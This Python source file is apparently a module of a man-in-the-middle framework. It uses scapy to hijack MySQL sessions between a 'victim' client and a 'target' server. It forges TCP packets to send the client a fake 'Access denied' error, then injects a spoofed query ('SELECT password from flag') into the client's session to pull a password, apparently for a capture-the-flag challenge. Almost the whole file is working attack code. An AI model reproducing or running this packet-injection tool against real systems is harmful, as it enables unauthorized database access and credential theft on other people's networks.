import scapy.all as scapy
from lib import logger as _
from datas import packet as lpkt
from lib.proto import Events, atoh, htos

log = _.log
protoname = "MySQL"
protolayer = "tcp"

class MySQL:
	nat	 = ""

	def __init__(self, host, client, server):
		#if isinstance(server, list):
		#	server = server[0]
		#if isinstance(client, list):
		#	client = client[0]
		self.server = server
		self.client = client
		#log.error("init, {} {}".format(len(server), server))
		# server -> client
		# except the first 3 packets server only send PA
		self.layout_srv = scapy.Ether(
			src=server.mac,
			dst=host[1]
		) / scapy.IP(
			src=server.ip,
			dst=client.ip
		) / scapy.TCP(
			sport=3306,
			dport=10000,
			flags = "A",
			seq = 1,
			ack = 1
		)
		# client -> server
		# except the first 3 packets client only send PA
		self.layout_cli = scapy.Ether(
			src=host[1],
			dst=server.mac
		) / scapy.IP(
			src=client.ip,
			dst=server.ip
		) / scapy.TCP(
			dport=3306,
			sport=10000,
			flags = "PA",
			seq = 1,
			ack = 79
		)

	def login(self, salt, password):
		True

	def access_denied(self, user, ip, password = False):
		return "Access denied for '{}'@'{}' (using password: {})".format(user, ip, "YES" if password else "NO")

	def deny(self, response):
		# packet length		= 0x00 0x00 0x00	(bytes on 3 octets)
		# packet number		= 0x02				(most of case 2 packets, 0x00 greetings, 0x01 login, 0x02 login)
		# response error	= 0xff				(response code, 0x00 for response ok)
		# error code		= 1504				(code: 1045)
		# SQL state			= 3238303030		(state: 28000)
		payload = "ff1504233238303030"+atoh(response)
		length = len(bytes.fromhex(payload)).to_bytes(3, 'little')
		return scapy.Raw(load=length+b"\x02"+htos(payload))

	def query(self, request):
		# packet length		= 0x00 0x00 0x00	(bytes on 3 octets)
		# packet number		= 0x00				(most of cases packet 0, query is the 1st)
		# MySQL query		= 0x03				(query command code)
		payload = "03"+atoh(request)
		length  = len(bytes.fromhex(payload)).to_bytes(3, 'little')
		return scapy.Raw(load=length+b"\x00"+htos(payload))

	def nat(self, port):
		self.layout_cli[scapy.TCP].sport = port;
		self.layout_srv[scapy.TCP].dport = port;

class Protocol:
	# Store the event object
	events  = None
	forge   = None
	trick   = False

	# Initialize the MYSQL protocol
	def __init__(self, host, stdin, victims, targets, gateway):
		global log, protoname, protolayer
		# Initialize the event handler with the source and distination IP Addresses
		self.events = Events(protolayer)
		self.forge  = MySQL(host, victims[0], targets[0])
		self.stdin	= stdin

		# Detect Syn Packet
		self.events.add('Syn', self.detect_syn, 
			"pkt[TCP].flags == 'S'",
		)
		# Detect FIN Packet
		self.events.add('Fin', self.detect_fin, 
			"pkt[TCP].flags == 'FA'",
		)
		# Detect Ack packet
		self.events.add('Ack', self.detect_ack, 
			"pkt[TCP].flags == 'A'",
		)
		# Detect PSH packet
		self.events.add('Psh', self.detect_psh, 
			"pkt[TCP].flags == 'PA'",
		)

	# Dectect SYN packets and increment
	def detect_syn(self, name, pkt):
		self.events.syn = self.events.syn + 1
		self.events.fin = 0
		# Set the port at SYN connexion
		self.forge.nat(pkt[scapy.TCP].sport)

	# Detect Fin packet, increment for FIN, and reset for all other flags
	def detect_fin(self, name, pkt):
		self.events.ack = 0
		self.events.psh = 0
		self.events.syn = 0
		self.events.fin = self.events.fin + 1
		self.trick = False
		log.print("######## fin ########")

	# Detect ACK packet and increment 
	def detect_ack(self, name, pkt):
		global log
		if not self.events.last[scapy.TCP].flags == 0x011 and not self.events.last[scapy.TCP].flags == 0x012:
			self.events.ack = self.events.ack + 1
			if self.events.ack == 1:
				self.forge.layout_srv[scapy.TCP].ack = pkt[scapy.TCP].seq
				self.forge.layout_srv[scapy.TCP].seq = pkt[scapy.TCP].ack
			else:
				scapy.sendp(self.forge.layout_cli, verbose=False)
		#log.debug("ack:\t{}".format(self.events.ack))

	# Detect PA (PSH) Packet and increment
	def detect_psh(self, name, pkt):
		self.events.psh = self.events.psh + 1
		#log.debug("psh:\t{}".format(self.events.psh))
		if self.events.psh == 1 and not self.trick:
			# send response error to client
			self.forge.layout_srv[scapy.TCP].ack = self.forge.layout_srv[scapy.TCP].ack + len(pkt[scapy.TCP].load)
			scapy.sendp(self.forge.layout_srv,
				verbose=False)
			self.forge.layout_srv[scapy.TCP].flags = 'PA'
			scapy.sendp(self.forge.layout_srv / self.forge.deny(
				self.forge.access_denied('root', self.forge.client.ip, False)
				),
				verbose=False
			)
		elif self.events.psh >= 2 and not self.trick:
			self.forge.layout_cli.seq = pkt[scapy.TCP].ack
			self.forge.layout_cli.ack = pkt[scapy.TCP].seq + len(pkt[scapy.TCP].load)
			scapy.sendp(self.forge.layout_cli / self.forge.query('SELECT password from flag'),
				verbose=False
			)
			self.trick = True

	def send_request(self, name, pkt):
		True

	def start(self):
		global protoname, protolayer
		self.events.exit.clear()
		self.events.start()
		log.print("Protocol {}[{}] started".format(protoname, protolayer))

	def stop(self):
		global protoname
		self.events.stop()
		log.print("Protocol {} is stopping".format(protoname))